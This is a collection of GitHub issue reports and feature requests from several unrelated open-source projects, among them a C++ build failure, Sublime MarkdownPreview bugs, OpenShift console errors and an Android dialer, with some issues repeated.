[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1212:9:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1230:54:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename Context = format_context, typename... Args>
[01;32m[K                                                      ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1232:20:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
     const Args&... args) {
[01;32m[K                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1232:24:[m[K [01;31m[Kerror: [m[Kdefault template arguments may not be used in function templates without -std=c++11 or -std=gnu++11
     const Args&... args) {
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kfmt::v5::format_arg_store<Context, Args ...> fmt::v5::make_format_args(const Args& ...)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1233:3:[m[K [01;35m[Kwarning: [m

make: *** [all] Error 2
[root@app build]#  I think it will be good if you will tell about this instrument on [Reddit](https://www.reddit.com/), [ProductHunt](https://www.producthunt.com/) and other resources. It might be very useful for some people) I think it will be good if you will tell about this instrument on [Reddit](https://www.reddit.com/), [ProductHunt](https://www.producthunt.com/) and other resources. It might be very useful for some people)
<---------->
127078980

<---------->
127656273
This isn't an issue so much as a suggestion. If you make a file explaining how you created the symbol map, others could potentially help figure out the mappings of new releases. 
<---------->
127878337
I'm trying to replicate this dashboard, but I'm missing many metrics. How do I get "kafka_log_size" metric for example?

*update*
Got it. I did not realise the confluent image was necessary. I was using different Kafka image. I'm trying to replicate this dashboard, but I'm missing many metrics. How do I get "kafka_log_size" metric for example?
<---------->
128036620
Pango fails to parse fonts. Did you install using aur or build them from the source. Would be a great help.
<---------->
128456735
When I run a query, the response Json also includes http status code, headers etc. This is great for debugging issues. But it would be great if there has an option to show the response body only as Kibana console does. Because I only care about the response body in most of the times. 
 Currently, if I create a file es.esquery, I have great (really great!) completion to build a `PUT _template/{template_name}` query. Thanks to this feature, it's very easy and convenient to define a elasticsearch index template.

But if I create a file `my_template.esind`, I have no completion to define template body.

=> This would be great to add completion support for `*.esind` files, with exactly the same index template completion available in `*.esquery` files. From the description of plugin I liked it very much especially the ElasticSearch explorer window. Alas on installing it just doesn't work without any trace of error that I could find. Then I cloned and tried to find the problem. Turns out simple case sensitivity related problems causing the problem.

I am soon raising a pull request hoping to be get merged and soon a new version should work when installed from vscode marketplace!

I will start using the plugin with my local copy meanwhile When you send _reindex request some characters are getting escaped, forming the bad request and getting error back from elastic.

When sending request:
`POST _reindex
{
    "source": {
        "index": "source"
    },
    "dest": {
        "index": "dest"
    }
}`

What actually gets sent to Elastic:
`{"source": "{\"index\": \"source\"}","dest": {"index": "dest"}}` Is there a way to setup user/pw for the envrionment? It would be great to use selfsigned certificates for ES endpoints, for now extension failing with error when trying to connect. 
Maybe there are some option about it, but can't find it in documentation. Is there a way to setup user/pw for the envrionment?  Maybe because of the removal of types from elasticsearch 7, most endpoints including types not work as expected and errors occur. From the description of plugin I liked it very much especially the ElasticSearch explorer window. Alas on installing it just doesn't work without any trace of error that I could find. Then I cloned and tried to find the problem. Turns out simple case sensitivity related problems causing the problem.

I am soon raising a pull request hoping to be get merged and soon a new version should work when installed from vscode marketplace!

I will start using the plugin with my local copy meanwhile From the description of plugin I liked it very much especially the ElasticSearch explorer window. Alas on installing it just doesn't work without any trace of error that I could find. Then I cloned and tried to find the problem. Turns out simple case sensitivity related problems causing the problem.

I am soon raising a pull request hoping to be get merged and soon a new version should work when installed from vscode marketplace!

I will start using the plugin with my local copy meanwhile This extension is great and would be even better if the es file extensions worked with the auto-format on vscode.
<---------->
128823988
As per the course author in "Build Automation" sections, these 3 files should be in example-solution branch:
- build.gradle
- gradlew
- gradlew.bat

These are not in the example-solution branch - or did I miss something?
<---------->
129170921
https://facelessuser.github.io/MarkdownPreview/usage/#livereload

Is it possible to make the following steps become automatic? Currently, I have to do this every time after ST is closed.

```
- Open the command palette and select the command LiveReload: Enable/disable plug-ins.
- Select Simple Reload with delay (400ms). It is possible you can get away with Simple Reload, but some experience an issue where they are one rev behind when using Simple Reload.
``` I have [trouble](https://github.com/wbond/package_control/issues/1403) using the package control, look like caused by the unreachable server. 
Could I get the .zip of Markdown Preview somewhere and just put it into the /Sublime Text 3/Packages manually? It is really hard to know which `pip` package to install to get the `import sublime` line working, for example. It would help a lot if you would make a `requirements.txt` so installing all necessary dependencies would be easy so that one can start working on this project immediately. It appears that Javascript highlighting is not working in my markdown files:

<img width="454" alt="screen shot 2019-01-18 at 6 32 11 am" src="https://user-images.githubusercontent.com/467780/51390044-552a8f00-1aeb-11e9-868e-5a0e29100043.png">

This differs from what one sees in Github (the below using 'javascript' and 'js'):

```javascript
var s = "JavaScript syntax highlighting";
alert(s);
```
 
```js
var s = "JavaScript syntax highlighting";
alert(s);
```

I'm using v2.2.2 of MarkdownPreview and Sublime v3.1.1 build 3176.  
 I had the default settings for this plugin, but tried setting them to the following, as well as reinstalling the plugin and restarting Sublime: 

```json
{ 
  "github_mode": "gfm", 
  "parser": "github",
  "build_action": "browser",
  "enabled_extensions": [
    "extra", 
    "github", 
    "codehilite(guess_lang=False,pygments_style=github)" 
  ] 
}
```

Is there something I'm missing? It appears that Javascript highlighting is not working in my markdown files:

<img width="454" alt="screen shot 2019-01-18 at 6 32 11 am" src="https://user-images.githubusercontent.com/467780/51390044-552a8f00-1aeb-11e9-868e-5a0e29100043.png">

This differs from what one sees in Github (the below using 'javascript' and 'js'):

```javascript
var s = "JavaScript syntax highlighting";
alert(s);
```
 
```js
var s = "JavaScript syntax highlighting";
alert(s);
```

I'm using v2.2.2 of MarkdownPreview and Sublime v3.1.1 build 3176.  
 I had the default settings for this plugin, but tried setting them to the following, as well as reinstalling the plugin and restarting Sublime: 

```json
{ 
  "github_mode": "gfm", 
  "parser": "github",
  "build_action": "browser",
  "enabled_extensions": [
    "extra", 
    "github", 
    "codehilite(guess_lang=False,pygments_style=github)" 
  ] 
}
```

Is there something I'm missing? When I set qutebrowser or surf (suckless.org)  as browser, Sublime freezes until I close the preview again.
Setting it to vivaldi works as expected.

My configuration:
Ubuntu 18.10, Sublime Build 3176, MarkdownPreview 2.2.2 ### 1. Summary

If I select `"html_simple": true` in settings, I have problems with permanent links.

### 2. Data

+ `Kira-MarkdownPreview__non-valid-unicode.md`:

```markdown
# Kira

Goddess
```

+ `User/MarkdownPreview.sublime-settings`:

```json
{
    "enabled_parsers": ["markdown"],
    "html_simple": true
}

```

### 3. Steps to reproduce

I reproduce the problem in a version of Sublime Text without plugins and user settings.

For `Kira-MarkdownPreview__non-valid-unicode.md`: <kbd>Ctrl+Shift+P</kbd> (<kbd>⌘⇧p</kbd> for Mac) → `MarkdownPreview: Save to HTML` → I open `Kira-MarkdownPreview__non-valid-unicode.html`.

### 4. Actual behavior

```html
<h1>Kira<a href="#kira" title="Permanent link"></a></h1>
<p>Goddess</p>
```

2 problems.

1. `` ([**U+E157**](http://www.fileformat.info/info/unicode/char/e157/index.htm)) not valid unicode character. Maybe `¶` ([**pilcrow sign**](http://www.fileformat.info/info/unicode/char/b6/index.htm)) do you mean instead?
1. No indent between header and permanent link. Even if pilcrow sign was used, HTML will look like this:

    ![Pilcrow-sign--No_indent](https://i.imgur.com/1mn75y2.png)

### 5. Expected behavior

```html
<h1>Kira <a href="#kira" title="Permanent link">¶</a></h1>
<p>Goddess</p>
```

![Pilcrow_sign--Indent](https://i.imgur.com/qrjjK6R.png)

See also [**real converted HTML example**](https://tuleap.net/plugins/tracker/?aid=12802). Symbol for permanent link does not mix with header text.

![MarkdownPreview__Tuleap](https://i.imgur.com/WW24seH.png)

### 6. Environment

+ Windows 10 Enterprise LTSB 64-bit EN
+ Sublime Text 3.1.1 Build 3176
+ MarkdownPreview 2.2.2

Thanks. hello,

used your package to output md to html. tried to change the fonts in your rendered html output but failed.

then found out the following:

css setting defined for .markdown-body class and almost all the descendants except tag p.
html reference to .markdown-body class in tag article
all text in your rendered html output is bracket by tag p within article, but not directly under tag article.

hence the css setting to .markdown-body class does not have any effect on the text (as bracket by tag p).

 I would like set permanent name of output html-file.

But every time I get various names of html-files, such as 82.html, 83.html, ... and I can't to contol this-)

Сan I fix this? I have [trouble](https://github.com/wbond/package_control/issues/1403) using the package control, look like caused by the unreachable server. 
Could I get the .zip of Markdown Preview somewhere and just put it into the /Sublime Text 3/Packages manually? It is really hard to know which `pip` package to install to get the `import sublime` line working, for example. It would help a lot if you would make a `requirements.txt` so installing all necessary dependencies would be easy so that one can start working on this project immediately. I would like the ability to copy the HTML file location to my clipboard.

There is an option to `Preview in Browser` but I would like a link to the file instead of opening it in my default browser. hello,

used your package to output md to html. tried to change the fonts in your rendered html output but failed.

then found out the following:

css setting defined for .markdown-body class and almost all the descendants except tag p.
html reference to .markdown-body class in tag article
all text in your rendered html output is bracket by tag p within article, but not directly under tag article.

hence changes in the css setting to .markdown-body class didn't work out.

 I want use functionality of this plugin for converting md-files **in my own python-files**. For example, such as python-lib. Сan I do that? Thanks-) **Sublime Text Version :** 3.2.1
**Browser :** Firefox 68.0.1
**Parser :** Markdown

When I try to add some text enclosed within brackets inside some bold text, and try to make it italic, the complete text doesn't remain bold, and something like that illustrated below is seen in the preview

### Sample text:
``` **Lorem Ipsum *(Dolor)* sit amet**```

### Expected output as seen on Github:

![Expected output](https://user-images.githubusercontent.com/29124655/61656893-58434980-acdf-11e9-9d86-1af9bc937ba2.png)

### Actual output as seen using `Markdown Preview: Preview in Browser -> markdown`:

![Actual output](https://user-images.githubusercontent.com/29124655/61656936-6beeb000-acdf-11e9-9f79-8a2d7a87f55e.png)


  When I set qutebrowser or surf (suckless.org)  as browser, Sublime freezes until I close the preview again.
Setting it to vivaldi works as expected.

My configuration:
Ubuntu 18.10, Sublime Build 3176, MarkdownPreview 2.2.2 ### 1. Summary

If I select `"html_simple": true` in settings, I have problems with permanent links.

### 2. Data

+ `Kira-MarkdownPreview__non-valid-unicode.md`:

```md
# Kira

Goddess
```

+ `User/MarkdownPreview.sublime-settings`:

```json
{
    "enabled_parsers": ["markdown"],
    "html_simple": true
}

```

### 3. Steps to reproduce

I reproduce the problem in a version of Sublime Text without plugins and user settings.

For `Kira-MarkdownPreview__non-valid-unicode.md`: <kbd>Ctrl+Shift+P</kbd> (<kbd>⌘⇧p</kbd> for Mac) → `MarkdownPreview: Save to HTML` → I open `Kira-MarkdownPreview__non-valid-unicode.html`.

### 4. Actual behavior

```html
<h1>Kira<a href="#kira" title="Permanent link"></a></h1>
<p>Goddess</p>
```

2 problems.

1. `` ([**U+E157**](http://www.fileformat.info/info/unicode/char/e157/index.htm)) not valid unicode character. Maybe `¶` ([**pilcrow sign**](http://www.fileformat.info/info/unicode/char/b6/index.htm)) do you mean instead?
1. No indent between header and permanent link. Even if pilcrow sign was used, HTML will look like this:

    ![Pilcrow-sign--No_indent](https://i.imgur.com/1mn75y2.png)

### 5. Expected behavior

```html
<h1>Kira <a href="#kira" title="Permanent link">¶</a></h1>
<p>Goddess</p>
```

![Pilcrow_sign--Indent](https://i.imgur.com/qrjjK6R.png)

See also [**real converted HTML example**](https://tuleap.net/plugins/tracker/?aid=12802). Symbol for permanent link does not mix with header text.

### 6. Environment

+ Windows 10 Enterprise LTSB 64-bit EN
+ Sublime Text 3.1.1 Build 3176
+ MarkdownPreview 2.2.2

Thanks. Hey, I am trying to use MarkdownPreview to build .md file on macOS with freshly installed package. The settings of MarkdownPreview is 

```
{
    "enable_autoreload": true,
    "browser": "default",
    "enable_highlight": true
}
```

The problem is that every time when I try to preview in default browser (Safari), though the status bar says that "Markdown Preview launched in default browser", there is nothing actually happening in my browser. I tried to change the browser to others like `/Applications/Safari.app` or `/Applications/Google Chrome.app` but it gives `cannot execute "/Applications/Safari.app" `. I also tried to remove and install again the package, but it does not help. It seems that no one before have encountered this exact problem and I wonder if anyone could help me out. https://facelessuser.github.io/MarkdownPreview/usage/#livereload

Is it possible to make the following steps become automatic? Currently, I have to do this every time after ST is closed.

```
- Open the command palette and select the command LiveReload: Enable/disable plug-ins.
- Select Simple Reload with delay (400ms). It is possible you can get away with Simple Reload, but some experience an issue where they are one rev behind when using Simple Reload.
```
<---------->
129430715
Please add [isomorƒ](https://isomorf.io/) to your repo. 

isomorƒ is a `visual programming environment for cloud services`

[![isomorf-welcome-12fc8a5dd1](https://user-images.githubusercontent.com/6625584/70478852-ed798b80-1a90-11ea-925e-8c5ad40d479c.png)](https://isomorf.io/)) Please add the following to `visual-programming-codex`:

1. isomorƒ (see issue #43)
1. Aardappel
1. Grail (Graphical Input Language) (see issue #40)
1. ADL
1. AgentSheets
1. Agilent
1. Alice
1. Amici
1. Appacitive
1. Apple Shake
1. AppWare
1. App Inventor For Android (mentioned [here](https://github.com/ivanreese/visual-programming-codex/blob/0b62d3a7b9d38ef2defa5a8e032d50f88a32974b/implementations.md#blockly))
1. Analog Box
1. Andescotia
1. ArcGIS Model Builder
1. Audulus (see issue #16)
1. Automagic
1. Automator
1. Babuino
1. BloodHound
1. Bounce
1. Mindrover
1. ChipWits
1. Copper Thoughts
1. Coral
1. Cortex
1. CyberToolbox
1. Designscript
1. DrawFBP
1. Dream Maker
1. Drupal
1. Dynamo
1. Engi JS
1. Etoys / Squeak
1. Eyeon Fusion
1. EyesWeb
1. Field
1. FL Studio
1. FlowLab
1. Foundry Modo
1. ReDiLab:Node
1. Flow Hub and NoFlo
1. FlowStone (see issue #39)
1. GenerativeComponents
1. GoDot Engine
1. Google Web Designer
1. HyperCard (mentioned [here](https://github.com/ivanreese/visual-programming-codex/blob/0b62d3a7b9d38ef2defa5a8e032d50f88a32974b/implementations.md#fabrik) and [here](https://github.com/ivanreese/visual-programming-codex/blob/0b62d3a7b9d38ef2defa5a8e032d50f88a32974b/implementations.md#fizzygum))
1. Hypergraph
1. iLab Neuromorphic Robotics Toolkit
1. Illumination Software
1. InfoSphere Streams
1. Intentional Technology
1. Isadora
1. Java Studio
1. Kimono
1. Klieg
1. Knime
1. Kodu (Boku)
1. Kyma
1. Ladder Logic (see issue #25)
1. Lamdu
1. Learnable Programming (mentioned [here](https://github.com/ivanreese/visual-programming-codex/blob/579519f62b0d7ebebdaf91b72033022e9c5212f0/reflections.md#bret-victor))
1. Lily
1. Limnor Studio
1. Little Big Planet
1. LiveCode
1. Mamba FX
1. MAX/MSP Jitter
1. Marten
1. MetaEdit+ Modeler
1. MiceOnABeam
1. Mind+
1. MVPL (Microsoft Visual Programming Language)
1. MindSpider
1. Minecraft
1. Minibloq
1. Minko ShaderLab
1. Modkit Arduino Visual Programming
1. Morphic
1. Mozilla Appmaker
1. MST Workshop
1. NeatTools Visual Programming Environment
1. Nevo Studio
1. Nuke
1. Num3sis Composer
1. NXT-G
1. OpenAlea Visualea
1. OpenDX
1. OpenFlippers
1. Open Modelica
1. Open Music
1. OpenWire
1. Orange
1. Pipes
1. Pypes
1. Praxis LIVE
1. Programming Without Coding Technology
1. Prograph
1. PSeint
1. Pygmalion
1. Quadrigram
1. RapidMiner
1. Reaktor
1. Redwire
1. Sextante
1. Sikuli
1. Sprog
1. Substance Designer
1. Synopsis
1. SynthEdit (mentioned [here](https://github.com/ivanreese/visual-programming-codex/issues/39))
1. SQL Server Integration Services
1. Streamtools
1. StroyCode
1. Stylus Studio
1. Tersus
1. TextIt
1. Thyrd
1. Touch Develop
1. Tydlig
1. Thymio VPL (mentioned [here](https://github.com/ivanreese/visual-programming-codex/blob/0b62d3a7b9d38ef2defa5a8e032d50f88a32974b/implementations.md#aseba))
1. Tynker
1. UDK Kismet
1. UDK (mentioned [here](https://github.com/ivanreese/visual-programming-codex/blob/0b62d3a7b9d38ef2defa5a8e032d50f88a32974b/implementations.md#litegraphjs))
1. Unix Tools
1. V+
1. Video Processing Language for the Raspberry Pi
1. VisTrails
1. Visual JForex
1. Viscuit
1. VRL-Studio
1. Windows Workflow Foundation
1. World Machine
1. Xpresso
1. Zaluum

Source: [Visual Programming Languages](http://blog.interfacevision.com/design/design-visual-progarmming-languages-snapshots/) by @erichosick (aka @erichosick2) http://audulus.com

This should probably go in Inspirations. It's a music processing app that looks a bit like a modular synthesizer and a patcher VPL, with a very pretty visual aesthetic  https://area.autodesk.com/tutorials/series/3ds-max-introduction-max-creation-graph/ There might be some good resources in this thread: https://clojureverse.org/t/wip-a-visual-blocks-engine-for-clojure-need-your-input/790 https://shade.to https://twitter.com/johnregehr/status/1095018518737637376

This is so rich. Look into PuzzleScript, KidSim, StageCast, PatternProgrammer. https://en.wikipedia.org/wiki/Petri_net

Not sure whether this is something I should just link to, or if this deserves a bit of a written reflection. I should probably also go dig up a few projects that implement petri nets with helpful extrapolations/extensions of the basic premise.

This twitter thread has some references: https://twitter.com/wires_wires/status/1141390416136351747 Hi @ivanreese :wave: 
I just found https://fluxion.app/. Repo here https://github.com/kyleparisi/Fluxion An interesting design for a structured editor. Some really clear thinking about UI design in the writeup, too. The color scheme isn't my taste, but the fact that color is used meaningfully super is. Cutesy names for concepts ("searchlection"). I love the "hold a key to activate a painting tool, then use arrow keys to paint" idea — both because I love held-key tools, and because I'm charmed whenever I see these the text-grid world borrowing metaphors from the mouse world.

http://disconcision.com/tagged/fructure https://github.com/pel-daniel/mind-bicyles#visual-programming-with-nodes

I cannot wait for the fall harvest. https://github.com/hypotext/notation  https://en.wikipedia.org/wiki/Petri_net

Not sure whether this is something I should just link to, or if this deserves a bit of a written reflection. I should probably also go dig up a few projects that implement petri nets with helpful extrapolations/extensions of the basic premise. https://github.com/retejs/rete

This project seems pretty rough, but it's surprisingly popular. There might be something to it that wasn't immediately obvious to me in my initial quick kick of the tires. https://github.com/features/actions https://modeling-languages.com/openponk-metamodeling-platform/ https://www.youtube.com/watch?v=2Cq8S3jzJiQ domain-agnostic keyboard-based visual programming language
https://github.com/szymonkaliski/DAS-UI
<---------->
129436456
We're using OpenShift v4.1.  We're adding spec descriptors to our operator and we've noticed that when the console tries to display instances of our CRD, if it tries to display something that is nested, we get a React error 31 similar to the following:
```
Minified React error #31; visit http://facebook.github.io/react/docs/error-decoder.html?invariant=31&args[]=object%20with%20keys%20%7Ba%2C%20b%7D&args[]= for the full message or use the non-minified dev environment for full errors and additional helpful warnings.
```

Consider the sample `memcached` operator, described here:
https://github.com/operator-framework/getting-started

We've built it, adding one extra spec field called `newfield`, and pushed it to dockerhub.  I've built a manifest/registry around it which can be installed using this catalogsource:
```yaml
apiVersion: operators.coreos.com/v1alpha1
kind: CatalogSource
metadata:
  name: memcached-manifests
  namespace: openshift-operator-lifecycle-manager
spec:
  sourceType: grpc
  image: kaczyns/memcached-registry:latest
  displayName: "Memcached Manifest"
```

After deploying the catalogsource and a subscription, edit the CSV YAML to add a second specDescriptor for the `newfield` field:
```yaml
        specDescriptors:
          - description: The desired number of member Pods for the deployment.
            displayName: Size
            path: size
            x-descriptors:
              - 'urn:alm:descriptor:com.tectonic.ui:podCount'
          - description: The new field
            displayName: Newfield
            path: newfield
```

Now on an instance of the CRD, add the `newfield` field:
```yaml
spec:
  newfield: fred
  size: 1
```

In the console, navigating to display the CRD instance shows the `Size` of 1, and `Newfield` as fred, since we have a specDescriptor for both.  If I now change newfield:
```yaml
spec:
  newfield:
    first: fred
    last:
      a: example-565cffdd9b-xpnbw
      b: nobody
  size: 1
```

Navigating again to the CRD instance shows the react error.  It seems like the level of nesting is important - it can handle a single level of nested objects, but not a second level of nested objects.

This is a problem for us, as our Helm based operator contains objects which may have arbitrary depth, and we don't necessarily know the names of the nested fields.  It's understandable if the console can't display the information in this field, but it seems better if the console could display the other displayable fields, instead of the React error.

Thanks for your help with this issue! Steps to reproduce:

1. Run console from the latest Docker image
2. Create https://raw.githubusercontent.com/operator-framework/getting-started/master/memcachedoperator.0.0.1.csv.yaml
3. Go to installed operators and click on the operator name:

![image](https://user-images.githubusercontent.com/5337267/51428271-c93e6300-1bcf-11e9-84f6-187bf223ef60.png)
 Minor issue I found on the project status page where the page view selector icon (dashboard) gets cut off at certain screen sizes. See screenshot below. @spadgett 

<img width="1161" alt="screen shot 2018-11-15 at 11 25 57 am" src="https://user-images.githubusercontent.com/40238481/48566747-9030fc00-e8c9-11e8-9e4a-91020eefdd7a.png">
 It used to work just a few hrs ago, not I can see that tags have been updated with the latest version and this error comes up:

![image](https://user-images.githubusercontent.com/5337267/51413428-ebd36c00-1b3c-11e9-89d2-efd7859ff26a.png)
 I would like the ability to add a Cassandra database imagestream to the Developer Catalog and see it under the Databases tab in the web console.

I currently have a pull request out to [sclorg/cassandra-container](https://github.com/sclorg/cassandra-container/pull/6/files) to add a CentOS 7 imagestream. 

Would there be anything else needed to accomplish this besides adding a Cassandra option under `catalog-items.jsx` as I have done [here](https://github.com/danielhelfand/console/commit/d8eaeba7f6c127fdc4e818dc3ae49c3a148e6867)?  Create a pod which doesn't have volumes and doesn't mount SA token:
```
apiVersion: v1
kind: Pod
metadata:
  name: example
  labels:
    app: hello-openshift
  namespace: default
spec:
  automountServiceAccountToken: false
  containers:
    - name: hello-openshift
      image: openshift/hello-openshift
      ports:
        - containerPort: 8080

```
Pod now cannot be viewed:
```
TypeError
Description:

e.spec.volumes is undefined
Component Trace:

in T
    in div
    in I
    in e
    in e
    in div
    in N
    in StatusBox
    in div
    in div
    in t
    in div
    in Unknown
    in Connect(Component)
    in t
    in Connect(t)
    in Unknown
    in div
    in t
    in DetailsPage
    in PodsDetailsPage
    in t
    in Unknown
    in ResourceDetailsPage
    in e
    in e
    in div
    in div
    in section
    in h
    in main
    in div
    in p
    in t
    in e
    in e
    in o
``` The oc login command under *? > Command Line Tools > _Copy Login Comman_* shows an internal URL which is not accessbile:

```
oc login --token=**** --server=https://api-int.NNNN.openshiftdemos.com:6443
```

The result is:
```
error: dial tcp: lookup api-int.NNNN.openshiftdemos.com on 10.0.2.3:53: no such host
```

The correct url is: `api.NNNN.openshiftdemos.com`
 Create a pod which doesn't have volumes and doesn't mount SA token:
```
apiVersion: v1
kind: Pod
metadata:
  name: example
  labels:
    app: hello-openshift
  namespace: default
spec:
  automountServiceAccountToken: false
  containers:
    - name: hello-openshift
      image: openshift/hello-openshift
      ports:
        - containerPort: 8080

```
Pod now cannot be viewed:
```
TypeError
Description:

e.spec.volumes is undefined
Component Trace:

in T
    in div
    in I
    in e
    in e
    in div
    in N
    in StatusBox
    in div
    in div
    in t
    in div
    in Unknown
    in Connect(Component)
    in t
    in Connect(t)
    in Unknown
    in div
    in t
    in DetailsPage
    in PodsDetailsPage
    in t
    in Unknown
    in ResourceDetailsPage
    in e
    in e
    in div
    in div
    in section
    in h
    in main
    in div
    in p
    in t
    in e
    in e
    in o
``` In version 4.1.0-rc.5 when listing the CRDs via "Administration - Custom Resource Definitions", one gets the following initial listing:

![grafik](https://user-images.githubusercontent.com/99080/58237833-5ba16f80-7d46-11e9-8906-12a19a646b60.png)

I.e. the table is sorted with the first column (NAME), ignoring case ("adapter" vs. "Aletermanager").

When now explicitly sorting after the name by pressing on the NAME column header, the column gets sorted, but with CRDs starting with upper-case letters first, while the CRDs with lower case letter come last:

![grafik](https://user-images.githubusercontent.com/99080/58238016-b89d2580-7d46-11e9-9808-3948a357a2f3.png)

I suggest that sorting via column header should also do a case insensitive sort. 

Whether the case of the "NAME" should be always starting with an upper-case is another question, because afaik the case for using any Kubernetes resources' kind doesn't matter at all (so the name could be always printed starting with an uppercase) 
```bash
~/.../go/console (master)$ ./bin/bridge
2019/05/29 08:44:16 cmd/main: cookies are not secure because base-address is not https!
2019/05/29 08:44:16 cmd/main: running with AUTHENTICATION DISABLED!
2019/05/29 08:44:16 cmd/main: Binding to 0.0.0.0:9000...
2019/05/29 08:44:16 cmd/main: not using TLS
index.html not found in configured public-dir path: open frontend/public/dist/index.html: no such file or directory
``` 
```bash
~/.../go/console (master)$ ./bin/bridge
2019/05/29 08:44:16 cmd/main: cookies are not secure because base-address is not https!
2019/05/29 08:44:16 cmd/main: running with AUTHENTICATION DISABLED!
2019/05/29 08:44:16 cmd/main: Binding to 0.0.0.0:9000...
2019/05/29 08:44:16 cmd/main: not using TLS
index.html not found in configured public-dir path: open frontend/public/dist/index.html: no such file or directory
``` ## Question

Is it possible to launch console using the docker image where we disable the auth, where we could specify the port to be used ?

```
kubectl run --image=quay.io/openshift/origin-console ocp4-console ....
``` The OpenShift 3.x web console previously had a Debug in Terminal option that spun up a separate Debug Container window with identical settings, changing the container's entrypoint to /bin/sh instead.  This option no longer appears in OpenShift 4. It would be great to have "Copy Login Command"  in `odo` section similarly to how it is done for `oc`.

<img width="599" alt="Screenshot 2019-05-15 at 14 31 35" src="https://user-images.githubusercontent.com/57206/57775824-34331d00-771e-11e9-9cbd-4b2550a2905f.png">


`odo` has the same login command as `oc`, so simply replacing command name (`oc --token ...` for `odo --token ...`) will work. 

It will be much more user-friendly if the user can just copy/paste the command.

 The oc login command under *? > Command Line Tools > _Copy Login Comman_* shows an internal URL which is not accessbile:

```
oc login --token=**** --server=https://api-int.NNNN.openshiftdemos.com:6443
```

The result is:
```
error: dial tcp: lookup api-int.NNNN.openshiftdemos.com on 10.0.2.3:53: no such host
```

The correct url is: `api.NNNN.openshiftdemos.com`
 It is often useful to dig down into resources of a given project X and then bounce back up to the full project view of X. Intuitively, I click on the project's name to do this, but that opens a drop down (which happens to be extremely long for me as cluster-reader and requires typing to filter). This can happen several times a minute so the context switch between the mouse and keyboard is costly.

Ideally, clicking the project name could take me back to the project view and clicking the chevron would lower the drop down. Alternatively, the current project should be place at the top of the otherwise alphabetically sorted list. In version 4.1.0-rc.5 when listing the CRDs via "Administration - Custom Resource Definitions", one gets the following initial listing:

![grafik](https://user-images.githubusercontent.com/99080/58237833-5ba16f80-7d46-11e9-8906-12a19a646b60.png)

I.e. the table is sorted with the first column (NAME), ignoring case ("adapter" vs. "Aletermanager").

When now explicitly sorting after the name by pressing on the NAME column header, the column gets sorted, but with CRDs starting with upper-case letters first, while the CRDs with lower case letter come last:

![grafik](https://user-images.githubusercontent.com/99080/58238016-b89d2580-7d46-11e9-9808-3948a357a2f3.png)

I suggest that sorting via column header should also do a case insensitive sort. 

Whether the case of the "NAME" should be always starting with an upper-case is another question, because afaik the case for using any Kubernetes resources' kind doesn't matter at all (so the name could be always printed starting with an uppercase) Firefox 66.0b12, didn't check if it happens in other browsers

1. Home -> Status
2. Switch to Dashboard
3. Scroll down to Details

![screenshot_2019-03-07 project status openshift container platform](https://user-images.githubusercontent.com/114501/53953290-3dc35780-40d3-11e9-95a2-ab3e7e0f1d82.png)
 I would like the ability to add a Cassandra database imagestream to the Developer Catalog and see it under the Databases tab in the web console.

I currently have a pull request out to [sclorg/cassandra-container](https://github.com/sclorg/cassandra-container/pull/6/files) to add a CentOS 7 imagestream for Cassandra. 

Would there be anything else needed to accomplish this besides adding a Cassandra option under `catalog-items.jsx` as I have done [here](https://github.com/danielhelfand/console/commit/d8eaeba7f6c127fdc4e818dc3ae49c3a148e6867)?  `PageHeading` and `HorizontalNav`are getting new data from Firehose. 
`HorizontalNav` itself has `Switch` with `Route`s inside. The router does not support dynamically creating pages with different props with full support of lifecycle methods. Meaning the component is unmounted and mounted again with each underlying resource change.

Real example:
Any change of state is discarded, if any change occurs to, for example the VM resource, while it is being edited inside the Overview page.

Proposed Solution. Move react Router to the top and do not pass dynamic props to it (just namespace, name, etc.):

```
DetailsPage
  Firehose
    PageHeading
  HorizontalNav
    Switch
      Route
        Firehose
          PageComponent
```

We could also just watch the resource (`watchK8sObject`) in `DetailsPage` and pass reduxIds down to the `PageHeading` and `PageComponent`


<---------->
129595002
  I am trying to implement a full functioning phone calling app but simple-phone is using inbuilt app.
Is their a way to implement it without using any other app ? Can i create a conference call with this? Steps:
0. reset apps settings(if installed previously)
1. click by phone number click (in browser)
2. select in suggestion dialog "CustomPhoneDialer"
3. launch
4. confirm "set as default"
5. enter/edit number + click done
6. appeared dialog with default dialer icon and skype (for example) -> by click on the default dialer icon opening CustomPhoneDialer.

Huawei P10Lite, android 8; Samsung S8+;
Why is show icon from default? How to change such behaviour? **Describe the bug**

I wanted to call from the app and when I clicked the number I want to call, I got redirected to my phone default caller.

To Reproduce

1. Open the app
2. Pick any number and dial.
3. Note the issue

I debug the app and notice that CallService not invoking.

**Device Details**

- SDK:23,
- Brand:Xiaomi,
- Model:Redmi 3S  Can it be modified to run inside my application without being default Hello, I really appreciate the work you have done in Kotlin. But, while integrating it to an existing Java project. Handling observers are quite confusing and leading to nullpointer or no UI update. Can you help me a little bit?  I managed to write a code to replace default phone app as explained in this repository. It is working only when screen is turned on. If screen is turned off, I can only hear ring tone, screen does not turn on. If I turn on screen manually, I can't see any call interface (not mine or not system default phone app. So I can't handle answer that call). How can I turn on screen when phone rings? I've tried several solutions about how to turn on screen, but no one is working in this case.

Any suggestions?
<---------->
129669057
Since this gem doesn't have an active maintainer, perhaps it should be officially deprecated in favor of ActiveRecordExtended: https://github.com/GeorgeKaraszi/ActiveRecordExtended

Here's a great example of a maintainer going through that process: https://github.com/flavorjones/chromedriver-helper/issues/83

CC @danmcclain @GeorgeKaraszi
<---------->
130001500
As I understand, this ProgPoW tree relies on never finding a solution below target, or else it'd try to validate the solution on CPU as Ethash, which will fail. The fork at https://github.com/BitcoinInterestOfficial/ProgPOW does simply:

```c
    // ProgPoW CPU validation is not implemented, override
    s_noeval = true;
```

Does any other tree implement lightweight ProgPoW validation on CPU?

